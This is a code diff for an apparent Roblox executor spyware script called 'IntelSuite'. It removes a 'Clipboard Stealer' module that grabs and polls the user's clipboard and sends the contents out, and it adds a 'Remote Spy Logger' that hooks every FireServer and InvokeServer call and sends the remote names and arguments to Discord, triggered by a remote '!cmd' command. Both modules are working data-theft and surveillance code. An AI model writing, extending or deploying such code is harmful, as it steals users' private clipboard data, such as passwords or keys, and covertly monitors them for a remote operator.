@@ -442,72 +442,62 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 9: Clipboard Stealer
--- Grabs whatever is in the user's clipboard on startup
--- Also polls every 60s for new clipboard content
+-- MODULE 10: Remote Spy Logger
+-- Hooks all RemoteEvent:FireServer() and RemoteFunction:InvokeServer()
+-- Logs remote name + args to Discord
+-- Activate via !cmd remotespy
 -- ============================================================
-local function stealClipboard()
-    if not getgenv().IntelSuite.IsActive then return end
-    pcall(function()
-        local clip = nil
+local function startRemoteSpy()
+    if getgenv().IntelSuite.RemoteSpyActive then
+        send("REMOTE SPY", "Already active.", 16776960)
+        return
+    end
+    getgenv().IntelSuite.RemoteSpyActive = true
 
-        -- Method 1: getclipboard (most executors)
-        if getclipboard then
-            local ok, r = pcall(getclipboard)
-            if ok and r and r ~= "" then clip = r end
-        end
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+        local method = getnamecallmethod()
+        local args = {...}
 
-        -- Method 2: Synapse X
-        if not clip and syn and syn.clipboard then
-            local ok, r = pcall(syn.clipboard.get)
-            if ok and r and r ~= "" then clip = r end
-        end
+        if method == "FireServer" or method == "InvokeServer" then
+            pcall(function()
+                if not getgenv().IntelSuite.IsActive then return end
+                local remoteName = tostring(self.Name)
+                local remotePath = tostring(self:GetFullName())
 
-        -- Method 3: toclipboard fallback read (some executors)
-        if not clip and getrbxclipboard then
-            local ok, r = pcall(getrbxclipboard)
-            if ok and r and r ~= "" then clip = r end
-        end
+                -- Build args string
+                local argStrs = {}
+                for i, v in ipairs(args) do
+                    local s = ""
+                    pcall(function()
+                        if type(v) == "table" then
+                            s = HttpService:JSONEncode(v)
+                        else
+                            s = tostring(v)
+                        end
+                    end)
+                    table.insert(argStrs, "[" .. i .. "] " .. s:sub(1, 100))
+                    if #argStrs >= 5 then break end
+                end
 
-        if clip and clip ~= "" then
-            send("CLIPBOARD",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Length:** " .. tostring(#clip) .. " chars" ..
-                "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
-                16711935
-            )
-        end
-    end)
-end
+                local argStr = #argStrs > 0 and table.concat(argStrs, "\n") or "none"
 
--- Run on startup
-task.wait(2)
-stealClipboard()
-
--- Poll every 60s for new clipboard content
-task.spawn(function()
-    local lastClip = ""
-    while true do
-        task.wait(60)
-        if not getgenv().IntelSuite.IsActive then continue end
-        pcall(function()
-            local clip = nil
-            if getclipboard then
-                local ok, r = pcall(getclipboard)
-                if ok and r and r ~= "" then clip = r end
-            end
-            if clip and clip ~= "" and clip ~= lastClip then
-                lastClip = clip
-                send("CLIPBOARD UPDATE",
-                    "**User:** " .. LocalPlayer.Name ..
-                    "\n**Length:** " .. tostring(#clip) .. " chars" ..
-                    "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
+                send("REMOTE SPY",
+                    "**Remote:** " .. remoteName ..
+                    "\n**Path:** " .. remotePath ..
+                    "\n**Method:** " .. method ..
+                    "\n**Args:**\n```" .. argStr:sub(1, 800) .. "```",
                     16711935
                 )
-            end
-        end)
-    end
-end)
+            end)
+        end
 
--- Store for !cmd clipboard
-getgenv().IntelSuite.StealClipboard = stealClipboard
+        return oldNamecall(self, ...)
+    end)
+
+    send("REMOTE SPY", "Now hooking all FireServer + InvokeServer calls.\n**User:** " .. LocalPlayer.Name, 65280)
+end
+
+-- Store for !cmd remotespy
+getgenv().IntelSuite.RemoteSpyActive = false
+getgenv().IntelSuite.StartRemoteSpy = startRemoteSpy
